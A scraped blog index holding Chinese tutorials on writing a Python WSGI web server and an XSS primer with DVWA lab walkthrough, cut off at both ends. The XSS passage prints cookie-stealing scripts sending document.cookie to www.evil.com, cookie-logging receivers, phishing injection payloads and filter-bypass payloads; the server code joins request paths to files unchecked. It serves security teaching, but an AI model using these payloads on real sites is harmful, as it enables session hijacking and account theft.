re.match(r\"(\\w+) +/[^ ]* \", request_start_line.decode(\"utf-8\")).group(1) env = &#123; \"PATH_INFO\": file_name, \"METHOD\": method &#125; response_body = self.app(env, self.start_response) response = self.response_headers + \"\\r\\n\" + response_body # 向客户端返回响应数据 client_socket.send(bytes(response, \"utf-8\")) # 关闭客户端连接 client_socket.close() def bind(self, port): self.server_socket.bind((\"\", port))def main(): sys.path.insert(1, WSGI_PYTHON_DIR) if len(sys.argv) &lt; 2: sys.exit(\"python MyWebServer.py Module:app\") # python MyWebServer.py MyWebFrameWork:app module_name, app_name = sys.argv[1].split(\":\") # module_name = \"MyWebFrameWork\" # app_name = \"app\" m = __import__(module_name) app = getattr(m, app_name) http_server = HTTPServer(app) # http_server.set_port http_server.bind(8000) http_server.start()if __name__ == \"__main__\": main() 1.1 sys.argv sys.argv[] 一个从程序外部获取参数的桥梁,外部参数不唯一，所以sys.argv以列表形式存储参数；其第一个元素是程序本身，随后才依次是外部给予的参数 简单测试 123#本测试是在jupyter notebook中测试import syssys.argv [&apos;c:\\\\users\\\\fishmouse\\\\appdata\\\\local\\\\programs\\\\python\\\\python37\\\\lib\\\\site-packages\\\\ipykernel_launcher.py&apos;, &apos;-f&apos;, &apos;C:\\\\Users\\\\fishmouse\\\\AppData\\\\Roaming\\\\jupyter\\\\runtime\\\\kernel-049997d2-f810-4826-9743-6db3b4d2e9ea.json&apos;] 本地测试 测试代码 123import sysb=sys.argvprint(b) 测试结果(第三个输出原因是在测试代码中打印了b[0]) Pycharm为当前程序添加（python MyWebServer.py）的参数 0x02 Web框架代码（MyWebFramework.py）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596# coding:utf-8import time# from MyWebServer import HTTPServer# 设置静态文件根目录HTML_ROOT_DIR = \"./html\"class Application(object): \"\"\"框架的核心部分，也就是框架的主题程序，框架是通用的\"\"\" def __init__(self, urls): # 设置路由信息 self.urls = urls def __call__(self, env, start_response): path = env.get(\"PATH_INFO\", \"/\") # /static/index.html if path.startswith(\"/static\"): # 要访问静态文件 file_name = path[7:] # 打开文件，读取内容 try: file = open(HTML_ROOT_DIR + file_name, \"rb\") except IOError: # 代表未找到路由信息，404错误 status = \"404 Not Found\" headers = [] start_response(status, headers) return \"not found\" else: file_data = file.read() file.close() status = \"200 OK\" headers = [] start_response(status, headers) return file_data.decode(\"utf-8\") for url, handler in self.urls: #(\"/ctime\", show_ctime) if path == url: return handler(env, start_response) # 代表未找到路由信息，404错误 status = \"404 Not Found\" headers = [] start_response(status, headers) return \"not found\"def show_ctime(env, start_response): status = \"200 OK\" headers = [ (\"Content-Type\", \"text/plain\") ] start_response(status, headers) return time.ctime()def say_hello(env, start_response): status = \"200 OK\" headers = [ (\"Content-Type\", \"text/plain\") ] start_response(status, headers) return \"hello world\"def say_haha(env, start_response): status = \"200 OK\" headers = [ (\"Content-Type\", \"text/plain\") ] start_response(status, headers) return \"hello big world\"urls = [ (\"/\", show_ctime), (\"/ctime\", show_ctime), (\"/sayhello\", say_hello), (\"/sayhaha\", say_haha), ]app = Application(urls)# if __name__ == \"__main__\":# urls = [# (\"/\", show_ctime),# (\"/ctime\", show_ctime),# (\"/sayhello\", say_hello),# (\"/sayhaha\", say_haha),# ]# app = Application(urls)# http_server = HTTPServer(app)# http_server.bind(8000)# http_server.start() 2.1 __call__ 在Python中，函数其实是一个对象： 12f=absf.__name__ &apos;abs&apos;1f(-123) 123 由于 f 可以被调用，所以，f 被称为可调用对象。 所有的函数都是可调用对象。 一个类实例也可以变成一个可调用对象，只需要实现一个特殊方法__call__()。 我们把 Person 类变成一个可调用对象： 1234567class Person(object): def __init__(self, name, gender): self.name = name self.gender = gender def __call__(self, friend): print('My name is %s...' % self.name) print ('My friend is %s...' % friend) 可以对 Person 实例直接调用： 12p = Person('Bob', 'male')p(\"Tim\") My name is Bob... My friend is Tim... 单看 p(&apos;Tim&apos;) 你无法确定 p 是一个函数还是一个类实例，所以，在Python中，函数也是对象，对象和函数的区别并不显著。测试结果","categories":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/categories/python/"},{"name":"Web服务器","slug":"python/Web服务器","permalink":"https://fishni.github.io/categories/python/Web%E6%9C%8D%E5%8A%A1%E5%99%A8/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://fishni.github.io/tags/Web/"},{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"}]},{"title":"【python-Web服务器】1.4 python-Web静态服务器-3-使用类","slug":"1.4 python-Web静态服务器-3-使⽤类","date":"2020-04-07T16:00:00.000Z","updated":"2020-04-08T06:28:47.866Z","comments":true,"path":"2020/04/08/1.4 python-Web静态服务器-3-使⽤类/","link":"","permalink":"https://fishni.github.io/2020/04/08/1.4%20python-Web%E9%9D%99%E6%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8-3-%E4%BD%BF%E2%BD%A4%E7%B1%BB/","excerpt":"本文主要内容 文件打开方式，文本与二进制区别 用类封装简单的Web静态服务器","text":"本文主要内容 文件打开方式，文本与二进制区别 用类封装简单的Web静态服务器 0x01 文件打开方式，文本与二进制区别 文本文件，操作系统会对\\n进行一些隐式变换，因此文本文件直接跨平台使用会出问题。在Windows下，写入\\n时，操作系统会隐式的将\\n转换为\\r\\n，再写入到文件中；读的时候，会把\\r\\n隐式转化为\\n，再读到变量中。在Linux下，写入’\\n’时，操作系统不做隐式变换。二进制文件，操作系统不会对\\n进行隐式变换，很多二进制文件（如电影、图片等）可以跨平台使用。 以二进制形式写入wb文件 123f= open(\"wb\",\"wb\")f.write(b\"hello\\nhello\")f.close() 以文本方式写入w文件 123f= open(\"w\",\"w\")f.write(\"hello\\nhello\")f.close() 使用Notepad++打开wb和w文件显示并无任何区别 分别读取观察,发现windows中文本读取将\\n变为\\r\\n 12with open(\"wb\",\"rb\") as f: print(f.read()) b&apos;hello\\nhello&apos;12with open(\"w\",\"rb\") as f: print(f.read()) b&apos;hello\\r\\nhello&apos;0x02 python使用类封装Web静态服务器 代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879# coding: utf-8import socketfrom multiprocessing import Processimport reHTML_ROOT_DIR = \"./html\"class HTTPserver(object): \"\"\"init\"\"\" def __init__(self): self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) def start(self): self.server_socket.listen(128) \"\"\"多进程处理请求\"\"\" while True: client_socket, client_address = self.server_socket.accept() print(\"[%s,%s]用户连接上了\" % client_address) handle_client_process = Process(target=self.handle_client, args=(client_socket,)) handle_client_process.start() client_socket.close() def handle_client(self,client_socket): \"\"\"处理客户端请求\"\"\" # 获取客户端数据 request_data = client_socket.recv(2048) print(\"request data:\",request_data) # 处理请求数据 request_lines = request_data.splitlines() for line in request_lines: print(line) # \"GET / HTTP/1.1\" request_start_line = request_lines[0] file_name = re.match(r\"\\w+ +(/[^ ]*)\",request_start_line.decode(\"utf-8\")).group(1) if \"/\" == file_name: file_name= \"/index.html\" # 打开文件 try: file = open(HTML_ROOT_DIR+file_name,\"rb\") except IOError: # 构造响应数据 response_start_line = \"HTTP/1.1 404 Not Found\\r\\n\" response_headers = \"Server: My testserver\\r\\n\" response_body = \"file is not found!\" else: file_data = file.read() file.close() # 构造响应数据 response_start_line = \"HTTP/1.1 200 0k\\r\\n\" response_headers = \"Server: My testserver\\r\\n\" response_body = file_data.decode(\"utf-8\") response = response_start_line + response_headers+ \"\\r\\n\"+ response_body print(\"response:\",response) # 向客户端发送数据 client_socket.send(bytes(response,\"utf-8\")) # 关闭客户端连接 client_socket.close() def bind(self,port): self.server_socket.bind((\"\", port))def main(): http_server = HTTPserver() http_server.bind(8000) http_server.start()if __name__ == \"__main__\": main()","categories":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/categories/python/"},{"name":"Web服务器","slug":"python/Web服务器","permalink":"https://fishni.github.io/categories/python/Web%E6%9C%8D%E5%8A%A1%E5%99%A8/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://fishni.github.io/tags/Web/"},{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"}]},{"title":"【python-Web服务器】1.5 python-Web动态服务器-1","slug":"1.5 python-Web动态服务器-1","date":"2020-04-07T16:00:00.000Z","updated":"2020-04-08T13:09:45.026Z","comments":true,"path":"2020/04/08/1.5 python-Web动态服务器-1/","link":"","permalink":"https://fishni.github.io/2020/04/08/1.5%20python-Web%E5%8A%A8%E6%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8-1/","excerpt":"本文主要内容 服务器动态资源请求相关知识（WSGI） python实现Web动态服务器示例","text":"本文主要内容 服务器动态资源请求相关知识（WSGI） python实现Web动态服务器示例 0x01 服务器动态资源请求1.1 浏览器请求动态页面过程 1.2 WSGI Web服务器网关接口（Python Web Server Gateway Interface，缩写为WSGI）是为Python语言定义的Web服务器和Web应用程序或框架之间的一种简单而通用的接口 怎么在你刚建立的Web服务器上运⾏⼀个Django应用和Flask应用，如何不做任何改变而适应不同的web架构呢？ 在以前，选择Python web架构会受制于可用的web服务器 ，反之亦然。 如果架构和服务器可以协同⼯作，那就好了： 但有可能面对（或者曾有过）下⾯的问题，当要把⼀个服务器和⼀个架构结合起来时，却发现他们不是被设计成协同⼯作的： 那么，怎么可以不修改服务器和架构代码⽽确保可以在多个架构下运⾏web 服务器呢？答案就是Python Web Server Gateway Interface (或简称 WSGI，读作“wizgy”)。 WSGI允许开发者将选择web框架和web服务器分开。可以混合匹配web服务 器和web框架，选择⼀个适合的配对。⽐如,可以在Gunicorn或者 Nginx/uWSGI 或者Waitress上运⾏Django,Flask,或 Pyramid。真正的混合 匹配，得益于WSGI同时⽀持服务器和架构： web服务器必须具备WSGI接⼝，所有的现代Python Web框架都已具备WSGI接口，它让你不对代码作修改就能使服务器和特点的web框架协同⼯作。WSGI由web服务器支持，⽽web框架允许你选择适合自己的配对，但它同样对于服务器和框架开发者提供便利使他们可以专注于自己偏爱的领域和专长 而不至于相互牵制。其他语言也有类似接⼝：java有Servlet API，Ruby有 Rack。 1.3 定义WSGI接口WSGI接⼝定义⾮常简单，它只要求Web开发者实现⼀个函数，就可以响应 HTTP请求。我们来看⼀个最简单的Web版本的“Hello World!”： 123def apllication(environ, start_response): start_reponse('200 ok',[('Content-Type','text/html')]) return 'Hello World!' 上⾯的pplication()函数就是符合WSGI标准的⼀个HTTP处理函数，它接收两个参数： environ：一个包含所有HTTP请求信息的dict对象 start_response：一个发送HTTP响应的函数 整个application()函数本身没有涉及到任何解析HTTP的部分，也就是说，把底层web服务器解析部分和应用程序逻辑部分进行了分离，这样开发者就可以专⼼做⼀个领域了 不过，这个application()函数怎么调用？如果我们自己调用，两个参数environ和start_response我们没法提供，返回的str也没法发给浏览器。 所以application()函数必须由WSGI服务器来调用。有很多符合WSGI规范的服务器。而我们此时的web服务器项目的目的就是做一个可以解析静态网页还可以解析动态网页的服务器 0x02 python-Web动态服务器示例2.1 本地Pycharm布置目录 2.2 web服务器代码（04_dynamic_web_server.py）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128# coding: utf-8import socketfrom multiprocessing import Processimport reimport sys# 设置静态文件根目录HTML_ROOT_DIR = \"./html\"# 设置动态执行文件目录WSGI_PYTHON_DIR = \"./wsgipython\"class HTTPserver(object): \"\"\"init\"\"\" def __init__(self): self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) def start(self): self.server_socket.listen(128) \"\"\"多进程处理请求\"\"\" while True: client_socket, client_address = self.server_socket.accept() print(\"[%s,%s]用户连接上了\" % client_address) handle_client_process = Process(target=self.handle_client, args=(client_socket,)) handle_client_process.start() client_socket.close() def start_response(self,status,headers): # 分析： start_response 处理响应的状态码和头部信息 \"\"\" status = \"200 OK\" headers = [ (\"Content-Type\", \"text/plain\") ] star \"\"\" response_headers = \"HTTP/1.1 \"+ status + \"\\r\\n\" for header in headers: response_headers += \"%s: %s\\r\\n\" % header self.response_headers = response_headers def handle_client(self, client_socket): \"\"\"处理客户端请求\"\"\" # 获取客户端数据 request_data = client_socket.recv(2048) print(\"request data:\",request_data) # 处理请求数据 request_lines = request_data.splitlines() for line in request_lines: print(line) # 解析请求报文 # \"GET / HTTP/1.1\" request_start_line = request_lines[0] # 提取用户请求的文件名 file_name = re.match(r\"\\w+ +(/[^ ]*)\",request_start_line.decode(\"utf-8\")).group(1) # 提取用户请求的方法 method = re.match(r\"(\\w+) +/[^ ]* \", request_start_line.decode(\"utf-8\")).group(1) # \"/ctime.py\" # \"/sayhello.py\" # 判断是否为动态资源请求 if file_name.endswith(\".py\"): # try使用提升容错率：也即访问的资源不存在时给出提示 try: # __import__魔术方法，导入已经创建的py模块，类似import # m这里以模块使用 m = __import__(file_name[1:-3]) except Exception: # 使用self.response_headers为服务器添加属性 self.response_headers = \"HTTP/1.1 404 Not Found\\r\\n\" response_body= \"not found\" else: # 字典表示请求的相关信息 env = &#123; \"PATH_INFO\":file_name, \"METHOD\":method &#125; response_body = m.application(env,self.start_response) # response 服务器响应浏览器请求的数据 response = self.response_headers+ \"\\r\\n\" + response_body else: if \"/\" == file_name: file_name= \"/index.html\" # 打开文件 try: file = open(HTML_ROOT_DIR+file_name,\"rb\") except IOError: # 构造响应数据 response_start_line = \"HTTP/1.1 404 Not Found\\r\\n\" response_headers = \"Server: My testserver\\r\\n\" response_body = \"file is not found!\" else: file_data = file.read() file.close() # 构造响应数据 response_start_line = \"HTTP/1.1 200 0k\\r\\n\" response_headers = \"Server: My testserver\\r\\n\" response_body = file_data.decode(\"utf-8\") response = response_start_line + response_headers+ \"\\r\\n\"+ response_body print(\"response:\",response) # 向客户端发送数据 client_socket.send(bytes(response,\"utf-8\")) # 关闭客户端连接 client_socket.close() def bind(self,port): self.server_socket.bind((\"\", port))def main(): # 利用sys模块导入路径 sys.path.insert(1, WSGI_PYTHON_DIR) http_server = HTTPserver() http_server.bind(8000) http_server.start()if __name__ == \"__main__\": main() 2.3 动态执行脚本（ctime.py）代码：12345678910111213141516171819202122232425# coding: utf-8import time# \"/ctime.py?timezone=e8\"# \"/ctime.py?timezone=e1\"def application(env, start_response): # env.get(\"Method\") # env.get(\"PATH_INFO\") # env.get(\"QUERY_STRING\") \"\"\" 分析1：env保存的是http的请求，apllication 函数利用env相关信息进行处理 分析2： 浏览器动态请求的页面，再次通过服务器响应至浏览器端，状态码，和头部信息需在apllication中处理 分析3：start_response函数用来处理响应的状态status和响应头headers返回至dynamic_web_server服务器 分析4：return 返回内容，也即是响应体response_body内容 \"\"\" status = \"200 OK\" headers = [ (\"Content-Type\", \"text/plain\") ] start_response(status, headers) return time.ctime() 2.4 执行流程图 大概画了一下 2.5 测试","categories":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/categories/python/"},{"name":"Web服务器","slug":"python/Web服务器","permalink":"https://fishni.github.io/categories/python/Web%E6%9C%8D%E5%8A%A1%E5%99%A8/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://fishni.github.io/tags/Web/"},{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"}]},{"title":"【XSS（一）】1.1 XSS介绍与原理","slug":"1.1 XSS介绍与原理","date":"2020-04-05T16:00:00.000Z","updated":"2020-04-14T08:52:36.280Z","comments":true,"path":"2020/04/06/1.1 XSS介绍与原理/","link":"","permalink":"https://fishni.github.io/2020/04/06/1.1%20XSS%E4%BB%8B%E7%BB%8D%E4%B8%8E%E5%8E%9F%E7%90%86/","excerpt":"本文主要整理了XSS相关知识，XSS类别、利用、危害以及简单的实例分析。","text":"本文主要整理了XSS相关知识，XSS类别、利用、危害以及简单的实例分析。 0x01 基础知识1.1 XSS简介跨站脚本（Cross-Site Scripting，XSS）是一种经常出现在 WEB 应用程序中的计算机安全漏洞，是由于 WEB 应用程序对用户的输入过滤不足而产生的。攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采取 Cookies 资料窃取、会话劫持、钓鱼欺骗等各种攻击 关键点： 目标网站的目标用户 浏览器 不被预期的： 攻击者在输入时提交了可控的脚本内容，然后在输出时被浏览器解析执行 “跨站脚本”重点是脚本：XSS在攻击时会嵌入一段远程的第三方域上的脚本资源。 总之，要想尽一切办法将你的脚本内容在目标网站中目标用户的浏览器上解释执行 1.2 XSS分类反射型 反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中。 反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。 服务器端代码： 1234567 &lt;?php // Is there any input? if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Feedback for end user echo '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . '&lt;/pre&gt;'; &#125; ?&gt; 可以看到，代码直接引用了 name 参数，并没有做任何的过滤和检查，存在明显的 XSS 漏洞。 存储型 持久型跨站脚本（Persistent Cross-Site Scripting）也等同于存储型跨站脚本（Stored Cross-Site Scripting）。 此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。 服务器端代码： 123456789101112131415&lt;?php if( isset( $_POST[ 'btnSign' ] ) ) &#123; // Get input $message = trim( $_POST[ 'mtxMessage' ] ); $name = trim( $_POST[ 'txtName' ] ); // Sanitize message input $message = stripslashes( $message ); $message = mysql_real_escape_string( $message ); // Sanitize name input $name = mysql_real_escape_string( $name ); // Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\"; $result = mysql_query( $query ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); //mysql_close(); &#125;?&gt; 代码只对一些空白符、特殊符号、反斜杠进行了删除或转义，没有做 XSS 的过滤和检查，且存储在数据库中，明显存在存储型 XSS 漏洞。 DOM型 传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。客户端 JavaScript 可以访问浏览器的 DOM 文本对象模型，因此能够决定用于加载当前页面的 URL。换句话说，客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据，而从客户端获得 DOM 中的数据（如从 URL 中提取数据）并在本地执行。另一方面，浏览器用户可以操纵 DOM 中的一些对象，例如 URL、location 等。用户在客户端输入的数据如果包含了恶意 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到基于 DOM 的 XSS 攻击。 HTML 代码： 1234567891011&lt;html&gt; &lt;head&gt; &lt;title&gt;DOM-XSS test&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; var a=document.URL; document.write(a.substring(a.indexOf(\"a=\")+2,a.length)); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 将代码保存在 domXSS.html 中，浏览器访问： 1http:&#x2F;&#x2F;127.0.0.1&#x2F;domXSS.html?a&#x3D;&lt;script&gt;alert(&#39;XSS&#39;)&lt;&#x2F;script&gt; DOM型与前两者的差别是，只在客户端进行解析，不需要服务器的解析响应 1.3 XSS 利用方式Cookies 窃取 攻击者可以使用以下代码获取客户端的 Cookies 信息 ： 12345&lt;script&gt;document.location=\"http://www.evil.com/cookie.asp?cookie=\"+document.cookienew Image().src=\"http://www.evil.com/cookie.asp?cookie=\"+document.cookie&lt;/script&gt;&lt;img src=\"http://www.evil.com/cookie.asp?cookie=\"+document.cookie&gt;&lt;/img&gt; 在远程服务器上，有一个接受和记录 Cookies 信息的文件，示例如下： 123456789&lt;% msg&#x3D;Request.ServerVariables(&quot;QUERY_STRING&quot;) testfile&#x3D;Server.MapPath(&quot;cookie.txt&quot;) set fs&#x3D;server.CreateObject(&quot;Scripting.filesystemobject&quot;) set thisfile&#x3D;fs.OpenTextFile(testfile,8,True,0) thisfile.Writeline(&quot;&quot;&amp;msg&amp; &quot;&quot;) thisfile.close set fs&#x3D;nothing%&gt; 123456&lt;?php$cookie = $_GET['cookie'];$log = fopen(\"cookie.txt\", \"a\");fwrite($log, $cookie . \"\\n\");fclose($log);?&gt; 攻击者在获取到 Cookies 之后，通过修改本机浏览器的 Cookies，即可登录受害者的账户。 会话劫持 由于使用 Cookies 存在一定的安全缺陷，因此，开发者开始使用一些更为安全的认证方式，如 Session。在 Session 机制中，客户端和服务端通过标识符来识别用户身份和维持会话，但这个标识符也有被其他人利用的可能。会话劫持的本质是在攻击中带上了 Cookies 并发送到了服务端。 如某 CMS 的留言系统存在一个存储型 XSS 漏洞，攻击者把 XSS 代码写进留言信息中，当管理员登录后台并查看是，便会触发 XSS 漏洞，由于 XSS 是在后台触发的，所以攻击的对象是管理员，通过注入 JavaScript 代码，攻击者便可以劫持管理员会话执行某些操作，从而达到提升权限的目的。 比如，攻击者想利用 XSS 添加一个管理员账号，只需要通过之前的代码审计或其他方式，截取到添加管理员账号时的 HTTP 请求信息，然后使用 XMLHTTP 对象在后台发送一个 HTTP 请求即可，由于请求带上了被攻击者的 Cookies，并一同发送到服务端，即可实现添加一个管理员账户的操作。 钓鱼 重定向钓鱼 把当前页面重定向到一个钓鱼页面。 1http:&#x2F;&#x2F;www.bug.com&#x2F;index.php?search&#x3D;&quot;&#39;&gt;&lt;script&gt;document.location.href&#x3D;&quot;http:&#x2F;&#x2F;www.evil.com&quot;&lt;&#x2F;script&gt; HTML 注入式钓鱼 使用 XSS 漏洞注入 HTML 或 JavaScript 代码到页面中。 1http:&#x2F;&#x2F;www.bug.com&#x2F;index.php?search&#x3D;&quot;&#39;&lt;html&gt;&lt;head&gt;&lt;title&gt;login&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;div style&#x3D;&quot;text-align:center;&quot;&gt;&lt;form Method&#x3D;&quot;POST&quot; Action&#x3D;&quot;phishing.php&quot; Name&#x3D;&quot;form&quot;&gt;&lt;br &#x2F;&gt;&lt;br &#x2F;&gt;Login:&lt;br&#x2F;&gt;&lt;input name&#x3D;&quot;login&quot; &#x2F;&gt;&lt;br &#x2F;&gt;Password:&lt;br&#x2F;&gt;&lt;input name&#x3D;&quot;Password&quot; type&#x3D;&quot;password&quot; &#x2F;&gt;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&lt;input name&#x3D;&quot;Valid&quot; value&#x3D;&quot;Ok&quot; type&#x3D;&quot;submit&quot; &#x2F;&gt;&lt;br&#x2F;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 该段代码会在正常页面中嵌入一个 Form 表单。 iframe 钓鱼 这种方式是通过&lt;iframe&gt;标签嵌入远程域的一个页面实施钓鱼。 1http:&#x2F;&#x2F;www.bug.com&#x2F;index.php?search&#x3D;&#39;&gt;&lt;iframe src&#x3D;&quot;http:&#x2F;&#x2F;www.evil.com&quot; height&#x3D;&quot;100%&quot; width&#x3D;&quot;100%&quot;&lt;&#x2F;iframe&gt; Flash 钓鱼 将构造好的 Flash 文件传入服务器，在目标网站用 &lt;object&gt; 或 &lt;embed&gt; 标签引用即可。 高级钓鱼技术 注入代码劫持 HTML 表单、使用 JavaScript 编写键盘记录器等。 网页挂马 一般都是通过篡改网页的方式来实现的，如在 XSS 中使用 &lt;iframe&gt; 标签 DOS 与 DDOS¶注入恶意 JavaScript 代码，可能会引起一些拒绝服务攻击。 XSS 蠕虫 ¶通过精心构造的 XSS 代码，可以实现非法转账、篡改信息、删除文章、自我复制等诸多功能。 Self-XSS 变废为宝的场景 ¶Self-XSS 顾名思义，就是一个具有 XSS 漏洞的点只能由攻击者本身触发，即自己打自己的攻击。比如个人隐私的输入点存在 XSS。但是由于这个隐私信息只能由用户本人查看也就无法用于攻击其他人。这类漏洞通常危害很小，显得有些鸡肋。但是在一些具体的场景下，结合其他漏洞（比如 CSRF ）就能将 Self-XSS 转变为具有危害的漏洞。下面将总结一些常见可利用 Self-XSS 的场景。 登录登出存在 CSRF，个人信息存在 Self-XSS，第三方登录 这种场景一般的利用流程是首先攻击者在个人信息 XSS 点注入 Payload，然后攻击者制造一个恶意页面诱导受害者访问，恶意页面执行以下操作： 恶意页面执行利用 CSRF 让受害者登录攻击者的个人信息位置，触发 XSS payload JavaScript Payload 生成 &lt;iframe&gt; 标签，并在框架内执行以下这些操作 让受害者登出攻击者的账号 然后使得受害者通过 CSRF 登录到自己的账户个人信息界面 攻击者从页面提取 CSRF Token 然后可以使用 CSRF Token 提交修改用户的个人信息 这种攻击流程需要注意几个地方：第三步登录是不需要用户交互的，利用 Google Sign In 等非密码登录方式登录；X-Frame-Options 需要被设置为同源（该页面可以在相同域名页面的 iframe 中展示 ） 登录存在 CSRF，账户信息存在 Self-XSS，OAUTH 认证 让用户退出账户页面，但是不退出 OAUTH 的授权页面，这是为了保证用户能重新登录其账户页面 让用户登录我们的账户页面出现 XSS，利用 使用 &lt;iframe&gt; 标签等执行恶意代码 登录回他们各自的账户，但是我们的 XSS 已经窃取到 Session 1.4 正则表达式规则 以一个网上商城应用 Magento 中的过滤类 Mage_Core_Model_Input_Filter_MaliciousCode 为例，部分代码如下： 1234567891011121314protected $_expressions = array( '/(\\/\\*.*\\*\\/)/Us', '/(\\t)/', '/(javascript\\s*:)/Usi', '/(@import)/Usi', '/style=[^&lt;]*((expression\\s*?\\([^&lt;]*?\\))|(behavior\\s*:))[^&lt;]*(?=\\&gt;)/Uis', '/(ondblclick|onclick|onkeydown|onkeypress|onkeyup|onmousedown|onmousemove|onmouseout|onmouseover|onmouseup|onload|onunload|onerror)=[^&lt;]*(?=\\&gt;)/Uis', '/&lt;\\/?(script|meta|link|frame|iframe).*&gt;/Uis', '/src=[^&lt;]*base64[^&lt;]*(?=\\&gt;)/Uis',);function filter($value) &#123; return preg_replace($this-&gt;_expressions, '', $value);&#125; 数组 $_expressions 中包含一系列用于过滤的正则表达式，然后通过使用 preg_replace 函数进行恶意代码的过滤。所以当尝试输入 &lt;script&gt;foo&lt;/script&gt; 时，两个标签都会被移除而只剩下 foo。 0x02 简单实例分析以下三个类型的实例，环境为DVWA平台，系统为windows 2.1 反射型XSS-Low等级 先利用alert测试是否存在xss 出现弹窗，说明存在xss漏洞 源码分析 1234567891011&lt;?phpheader (\"X-XSS-Protection: 0\");// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Feedback for end user echo '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . '&lt;/pre&gt;';&#125;?&gt; 通过源码，观察，直接使用name参数，并未进行任何过滤和检查，故存在xss漏洞 编写PHP文档获取页面的cookie： 12345&lt;?php$cookie=$_GET['cookie'];file_put_contents('cookie.txt',$cookie);?&gt; 编写js代码将页面的cookie发送到cookie.php中 当在火狐浏览器中在，以下位置输入 1&lt;script&gt;document.location='http://127.0.0.1/cookie.php?cookie='+document.cookie&lt;/script&gt; 并点击提交，页面跳转，说明执行了js代码 1 跳转至下页面，并打开cookie.txt 如上图，表示成功拿到cookie，也就可以通过cookie登陆dvwa js代码分析： document.location [document 对象] :该对象是window和frames对象的一个属性,是显示于窗口或框架内的一个文档 document.location 包含 href 属性，直接取值赋值时相当于 document.location.href。document.location.href 当前页面完整 URL 2.2 反射型XSS-Medium等级 先利用alert进行弹窗测试 发现页面没有反应，有可能是被过滤了，浏览器虽然会过滤·&lt;script&gt;标签关键字，但是只过滤一次，所以可以想办法绕过 绕过1： 通过构造两个标签，即嵌套 出现弹窗，说明存xss 绕过2：也可以大小写混写进行绕过 出现弹窗，说明存在xss 然后利用js代码获取cookie,成功拿到cookie 源代码分析 1234567891011121314&lt;?phpheader (\"X-XSS-Protection: 0\");// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] ); // Feedback for end user echo \"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;\";&#125;?&gt; str_replace()对&lt;script&gt;进行了过滤‘ 2.3 反射型XSS-High等级 还是先利用弹窗测试是否存在xss,像low和medium等级那样操作发现页面并没有出现弹窗。 接下来我们换个标签，img标签和iframe标签（在一个HTML中嵌入另一个HTML） Img：&lt;img src=x onerror=alert(1)&gt; Iframe: &lt;iframe onload=alert(1)&gt; 两个都成功的出现弹窗 源代码分析 1234567891011121314&lt;?phpheader (\"X-XSS-Protection: 0\");// Is there any input?if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); // Feedback for end user echo \"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;\";&#125;?&gt; 利用preg_replace()正则表达过滤掉所有形式的&lt;script&gt; 观察下面反射型xss-impossible等级代码 123456789101112131415 &lt;?php // Is there any input? if( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Check 